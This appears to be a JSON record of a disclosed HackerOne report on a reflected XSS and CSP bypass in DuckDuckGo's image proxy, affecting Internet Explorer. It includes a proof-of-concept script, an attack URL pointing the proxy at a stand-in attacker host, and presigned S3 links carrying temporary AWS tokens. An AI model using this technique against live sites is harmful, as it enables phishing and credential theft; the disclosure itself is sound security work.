{
  "id": 395734,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTU3MzQ=",
  "url": "https://hackerone.com/reports/395734",
  "title": "XSS in Subdomain of DuckDuckGo",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-08-16T04:41:01.995Z",
  "submitted_at": "2018-08-16T04:41:01.995Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mr_r3boot",
    "url": "/mr_r3boot",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/172/712/da5b2de96cb6ad1bc8fba57f45205e6592514185_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 10995,
    "url": "https://hackerone.com/duckduckgo",
    "handle": "duckduckgo",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "DuckDuckGo",
      "twitter_handle": "duckduckgo",
      "website": "https://duckduckgo.com",
      "about": "Independent online protection company. Get our mobile & desktop browser with protections built-in, including our search engine that doesn’t track you."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-02-01T15:35:41.967Z",
  "bug_reporter_agreed_on_going_public_at": "2024-01-02T15:35:41.409Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team,\n\nI would like to report CSP bypass and full fledged reflected xss on ```proxy.duckduckgo.com```.\n\n#Description:\nOn proxy domain to avoid script executions there is presence of CSP header ```script-src``` which set to none. In order to exploit this issue a remote attacker need to submit a valid nonce generated by Content Security Policy. But due to the fact that IE still doesn't support this header as stated in ```https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#Browser_compatibility```. So it is possible to bypass this restriction.\n\n#Steps to Reproduce:\n1. Host following script in your domain.\n```\n<html><script>alert(document.domain);</script></html>\n```\n\n2. Share the following URL with victim.\n```\nhttps://proxy.duckduckgo.com/iur/?f=1&image_host=http://attackerdomain.com/xsspage\n```\n3. Once if victim open the link in IE then he/she can see the script will get executed in the context of duckduckgo domain.\n\n#Browser Tested on:\n1. IE 11.192 - We can see script execution.\n2. Microsoft Edge 41.16299.15.0 - ```CSP14321: Resource violated directive 'script-src 'none'' in Content-Security-Policy: inline script, in https://proxy.duckduckgo.com/iur/?f=1&image_host=http://138.197.172.108/index.html at line 1 column 8. Resource will be blocked.```\n3. Mozilla Firefox 52 - ```Content Security Policy: The page’s settings blocked the loading of a resource at self (“script-src 'none'”). Source: \nalert(document.domain);```\n4. Google Chrome Version 68.0.3440.106 (Official Build) (64-bit) - ```Refused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'none'\". Either the 'unsafe-inline' keyword, a hash ('sha256-LNFMfdZ+OpsZfPTkBYm2BOeU5h3C3lAC8Em3x/Rc9mA='), or a nonce ('nonce-...') is required to enable inline execution.```\n\n## Impact\n\n1. Attacker can host a spoofed login page and can sniff all credentials.\n2. It's possible to dos victims browser",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 334026,
      "file_name": "xss.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/334/026/0f261c412415c5e7896726456b8db3638a119b61/xss.png?response-content-disposition=attachment%3B%20filename%3D%22xss.png%22%3B%20filename%2A%3DUTF-8%27%27xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXUB7NLT6%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T192628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJHMEUCIEOoCU2uLkgzSill73OnYAPEZ5%2FPJSGNjzdlmGxLJ21%2BAiEA4OK2MABUmQ%2FRuu3WHQARY5JOBbhGDN45%2FB00jxmburoqugUI8v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCE8UvbyKZFpm2hYMyqOBVfHEqxQi4oxeHtgwSkJrz8JhrkeCcC5JiRXAVYaMJMVXl8g96tP8peE%2BdpnHH2uMyBIVUGcNbm7WrhI9Oem6xGPZhvVRqSk%2F40MloZ%2FDcfsF5m85cTZsuFMsmSjscnF7ZNNVkgYIpy5yVH6VkgB0wqCY%2BmbNBO7v5O90o0vwR6cHyhAM4oWTbWT50Pkmf00UnveO0WzhPFWw%2BNWfqli5aUBoPk7k%2Bx9RYxxG6gIqfBpjd21wW9PUxl1x5RygyiHIpP2h5hDrdq0wpXt9k86othGxdO6MQLV2NlRTaWQe1eIAHR0JdV4n2X8sT2dDhDFY42qLKcLMCCFKQmO1ryjp2BVQoJNG%2FKil0q9iQNOG6JdzQHl4cjysK%2FFSUH8DvYwXc6mr1lYULqou9EyhIBfHMTmHpf2dQavX%2FZwvi2Lak9o%2BJz9cw3CYBVfZCbmBrZXCtRU5G5bqy9vMJv5oUulnw0KtqLk0CGqqYOfjFoa0u1iFFA%2FVAmqrfmZSfHeBv1joSV6TtA9Ds7tauxXExrgx1W9q%2FYDv6sKVeLzki69aIGwndWg3rCesxck3v%2F%2Bongb93Lacyp7UZx0crLe8AzMzcLyKOjuUiqg4eT1fWR%2BdW%2FohQmk4p%2BxHJfURas4PlQkgEAaBeEGD7HxhT3svfzWLWeL2XrsdFwC4SQjGHt4Z0zowDcjJ3AjiGnvnaJRIbd%2B7%2Bp1ef1O4LwI1WdEtSciUQoycHCOa6cTR9oEOWAwq5sDmD3QppRTIFOOTZMngrc1p6%2F7xcusJwKD0Go0TWII7i6vOng6WT0WhRCo2nU5El91tDAt%2FjlFzgzu%2BhmV0727zOP3veeGlruFGNVqgmwEjTzjzVtQ0E1QHRi8kSl01jDNs7vGBjqxAW6IdFXglXF7gf6f0%2FjGuRFOa557khKRlFGHwbuX8xfMl1G7RiG1cNlpwiY1dudfyuZ%2BQ5GC6mKlrko2MHZCrFLZN9%2FRBdOrRexUkRzRC%2FKijXgGPPFnB4YBvQD7Q4i07%2BtFclb6FkYzvS4hrLB9eD6bAHWXNjMmsFZoxkBu0fvy%2FEqD57E8%2FXFLnBuNyxVRe0BiOCnd7JIQtfyChuYqq4MgDrlTVQGMGhC0OOyS2SzRcg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=16b64224c97c7f4a30ba07986983e0cb934c7ab501e054e09b8e54521dcd153a",
      "file_size": 18981,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 334027,
      "file_name": "response.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/334/027/1e1f161db7ac2f35cc0ab2e4bda4a0dd7fdb2497/response.png?response-content-disposition=attachment%3B%20filename%3D%22response.png%22%3B%20filename%2A%3DUTF-8%27%27response.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXUB7NLT6%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T192628Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJHMEUCIEOoCU2uLkgzSill73OnYAPEZ5%2FPJSGNjzdlmGxLJ21%2BAiEA4OK2MABUmQ%2FRuu3WHQARY5JOBbhGDN45%2FB00jxmburoqugUI8v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCE8UvbyKZFpm2hYMyqOBVfHEqxQi4oxeHtgwSkJrz8JhrkeCcC5JiRXAVYaMJMVXl8g96tP8peE%2BdpnHH2uMyBIVUGcNbm7WrhI9Oem6xGPZhvVRqSk%2F40MloZ%2FDcfsF5m85cTZsuFMsmSjscnF7ZNNVkgYIpy5yVH6VkgB0wqCY%2BmbNBO7v5O90o0vwR6cHyhAM4oWTbWT50Pkmf00UnveO0WzhPFWw%2BNWfqli5aUBoPk7k%2Bx9RYxxG6gIqfBpjd21wW9PUxl1x5RygyiHIpP2h5hDrdq0wpXt9k86othGxdO6MQLV2NlRTaWQe1eIAHR0JdV4n2X8sT2dDhDFY42qLKcLMCCFKQmO1ryjp2BVQoJNG%2FKil0q9iQNOG6JdzQHl4cjysK%2FFSUH8DvYwXc6mr1lYULqou9EyhIBfHMTmHpf2dQavX%2FZwvi2Lak9o%2BJz9cw3CYBVfZCbmBrZXCtRU5G5bqy9vMJv5oUulnw0KtqLk0CGqqYOfjFoa0u1iFFA%2FVAmqrfmZSfHeBv1joSV6TtA9Ds7tauxXExrgx1W9q%2FYDv6sKVeLzki69aIGwndWg3rCesxck3v%2F%2Bongb93Lacyp7UZx0crLe8AzMzcLyKOjuUiqg4eT1fWR%2BdW%2FohQmk4p%2BxHJfURas4PlQkgEAaBeEGD7HxhT3svfzWLWeL2XrsdFwC4SQjGHt4Z0zowDcjJ3AjiGnvnaJRIbd%2B7%2Bp1ef1O4LwI1WdEtSciUQoycHCOa6cTR9oEOWAwq5sDmD3QppRTIFOOTZMngrc1p6%2F7xcusJwKD0Go0TWII7i6vOng6WT0WhRCo2nU5El91tDAt%2FjlFzgzu%2BhmV0727zOP3veeGlruFGNVqgmwEjTzjzVtQ0E1QHRi8kSl01jDNs7vGBjqxAW6IdFXglXF7gf6f0%2FjGuRFOa557khKRlFGHwbuX8xfMl1G7RiG1cNlpwiY1dudfyuZ%2BQ5GC6mKlrko2MHZCrFLZN9%2FRBdOrRexUkRzRC%2FKijXgGPPFnB4YBvQD7Q4i07%2BtFclb6FkYzvS4hrLB9eD6bAHWXNjMmsFZoxkBu0fvy%2FEqD57E8%2FXFLnBuNyxVRe0BiOCnd7JIQtfyChuYqq4MgDrlTVQGMGhC0OOyS2SzRcg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff76e31c825a36f11a112b2727b93804a171389f3899cfd1fb68fd6f9421ff91",
      "file_size": 60641,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2024-02-01T15:35:41.735Z",
  "allow_singular_disclosure_after": -51594646.31529384,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "loaymorad",
    "2026"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 8671,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.duckduckgo.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
